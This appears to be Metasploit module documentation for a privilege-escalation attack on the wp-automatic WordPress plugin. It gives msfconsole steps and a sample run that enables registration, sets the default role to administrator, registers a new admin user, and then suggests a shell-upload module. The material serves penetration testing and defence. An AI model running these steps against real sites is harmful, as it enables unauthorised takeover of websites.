## Vulnerable Application

This module exploits an unauthenticated arbitrary wordpress options change vulnerability
in the Automatic (wp-automatic) plugin <= 3.53.2.

If `WPEMAIL` is provided, the administrator's email address will be changed.

User registration is enabled, and default user role is
set to administrator.  A user is then created with the `USER` name set.
A valid `EMAIL` is required to get the registration email (not handled in MSF).

A vulnerable version of the plugin can be downloaded [here](https://legendblogs.com/wp-automatic-plugin-free-download)

## Verification Steps

1. Install the vulnerable plugin
1. Start msfconsole
1. Do: `use auxiliary/admin/http/wp_automatic_plugin_privesc`
1. Do: `set rhosts [IPs]`
1. Do: `set email [email address]`
1. Do: `run`
1. You should get an email to setup your new admin account.

## Options

### EMAIL

Email for registration. No default.

### USER
Username for registration, defaults to `msfuser`

### WPEMAIL

Wordpress Administration Email. No default.

## Scenarios

### wp-automatic 3.50.7 on Wordpress 5.4.4 No WPEMAIL

```
resource (automatic.rb)> use auxiliary/admin/http/wp_automatic_plugin_privesc
[*] Using auxiliary/admin/http/wp_automatic_plugin_privesc
resource (automatic.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (automatic.rb)> set verbose true
verbose => true
resource (automatic.rb)> set email fake@example.com
email => fake@example.com
resource (automatic.rb)> run
[*] Running module against 1.1.1.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Enabling user registrations...
[*] Setting the default user role type to administrator...
[*] Registering msfuser with email fake@example.com
[+] For a shell: use exploits/unix/webapp/wp_admin_shell_upload
[*] Auxiliary module execution completed
```
